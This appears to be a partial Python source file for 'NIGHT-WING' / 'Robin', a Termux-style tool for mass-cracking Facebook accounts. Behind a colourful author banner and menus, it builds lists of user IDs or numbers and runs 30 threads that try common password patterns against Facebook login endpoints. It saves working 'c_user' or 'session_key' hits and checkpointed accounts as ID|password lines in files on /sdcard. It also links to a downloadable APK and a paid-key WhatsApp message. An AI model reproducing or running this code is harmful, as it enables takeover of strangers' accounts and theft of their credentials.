...
logo=("""\033[1;37m
\033[0;92m    _  _____________ ________  _      _______  _______
\033[0;93m   / |/ /  _/ ___/ // /_  __/ | | /| / /  _/ |/ / ___/
\033[0;94m  /    // // (_ / _  / / /    | |/ |/ // //    / (_ / 
\033[0;95m /_/|_/___/\___/_//_/ /_/     |__/|__/___/_/|_/\___/
----------------------------------------------
 Author    : AFTAB AHMAD
 Github    : NIGHT-WINGS-36
 Facebook  : AFTAB AHMAD
 Tool Name : NIGHT-WING
 Type type : FREE
 Version   : 1.0
----------------------------------------------
 Robin Pro version 1.0
 For Haters: APKA ABU JAN  🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first123,first786,first@!123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                ...
                                os.system(f'xdg-openhttps://www.facebook.com/4F1.H3R3{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Robin_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi Robin MAM, I Need To Buy Your Paid Robin PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Robin.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Robin:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Robin.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Robin-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Robin=session.cookies.get_dict().keys()
                        if "c_user" in Robin:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [Robin-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Robin-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Robin:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Robin-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Robin-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Robin-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Robin-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Robin-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Robin-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Robin-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Robin-OK] '+uid+' | '+pas+'\033[1;97m')
